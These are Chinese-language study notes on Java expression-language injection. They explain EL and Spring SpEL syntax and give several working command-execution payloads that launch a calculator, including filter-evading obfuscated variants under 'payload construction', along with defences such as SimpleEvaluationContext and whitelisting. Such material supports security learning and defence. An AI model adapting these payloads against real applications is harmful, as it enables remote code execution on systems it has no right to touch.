OGNL(struts2)、SpEL(spring)、MVEL、EL、Fel、JSTL+EL等
# **EL表达式**
原生EL（Expression Language）表达式 是为了使JSP写起来更加简单。
```
//执行命令
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")}
```


^
# **Spring的SpEL表达式注入**
```
把字符串当做代码执行。
数学表达式执行。
配置文件解析：SpEL可以解析配置文件中的动态值，引用其他属性或方法的值，实现配置的动态性。
SpEL通常用在Spring框架的某些特定场景中，比如
在配置文件中通过`${...}`使用属性占位符，或者在注解中实现复杂的逻辑，例如`@Conditional`注解。
```

当集成的spring-boot-starter-web依赖后，就可以自动使用。
关键词：StandardEvaluationContext()；
```
String spel ="T(java.lang.Runtime).getRuntime().exec(\"calc\")"; 
//T()包裹后可以直接调用静态方法和静态属性。
ExpressionParser parser=new SpelExpressionParser();
Expression expression=parser.parseExpression(spel);
EvaluationContext context=new StandardEvaluationContext();
expression.getValue(context);

```

CVE复现：<https://cloud.tencent.com/developer/article/2144995>
防御：使用时做白名单，只有需要的字符串才能当作代码执行。




### SpEL表达式 #{} 和 {} 和 # 和 '' 的使用
1. #{} 表达式
   #{} 用于在 Spring 配置文件中表示需要解析的 SpEL 表达式。主要用于注解、XML 配置和属性文件中，通常在需要动态计算的场景下使用。
```java 
@Value("#{systemProperties['user.home']}")
private String userHome;
```
2. `#` 符号   
`#` 符号在 SpEL 表达式中用于引用变量或方法。通常在解析上下文中使用，以引用方法、属性或在表达式中定义的变量。
```java 
SpelExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext context = new StandardEvaluationContext();
context.setVariable("number", 42);

Integer number = parser.parseExpression("#number").getValue(context, Integer.class);
```
3. ` '' `字符串  
   用于在 SpEL 表达式中表示字符串文字。字符串文字在 SpEL 表达式中必须用单引号括起来，以区分其他类型的值（如数字、变量等）。
```java 
SpelExpressionParser parser = new SpelExpressionParser();
String result = parser.parseExpression("'Hello ' + 'World'").getValue(String.class);
```
4. `{}`   
    花括号 {} 通常用于在集合、数组或映射中表示集合字面量。以下是一些具体的用法和示例。
### Spel注入  
存在Spel注入的前提是存在SpEl相关的库，如下是相关的库
```java
org.springframework.expression.spel.standard
SpelExpressionParser
parseExpression
expression.getValue();
expression.setValue();
```
 SpEl解析SpEL提供了两套不同的接口，分别是"SimpleEvaluationContext"和"StandardEvaluationContext"。其中"SimpleEvaluationContext" 
 仅支持简单的表达式，抛弃了Java类型引用，构造函数，相较比较安全。而"StandardEvaluationContext" 支持复杂的表达式，如方法调用、属性访问等。
 如果在不指定EvaluationContext的情况下，SpEl默认使用"StandardEvaluationContext"。
 ```java
// 执行exec
T(java.lang.Runtime).getRuntime().exec("calc.exe");
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe");

 ```

### 构造payload
```
T(java.lang.Ru" + "ntime).getRuntime().exec('calc');
String spel = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))" +".invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")" +".getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()" +".forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})\n";
new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("java.lang.Runtime.getRuntime().exec('calc')")";
T(java.lang.Runtime).getRuntime().exec("calc")
T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))
```

## Spel 防御
使用 SimpleEvaluationContext
```java
SpelExpressionParser parser = new SpelExpressionParser();
SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
expression.setValue(context, "payload");
```



^
# **OGNL(struts2)表达式注入**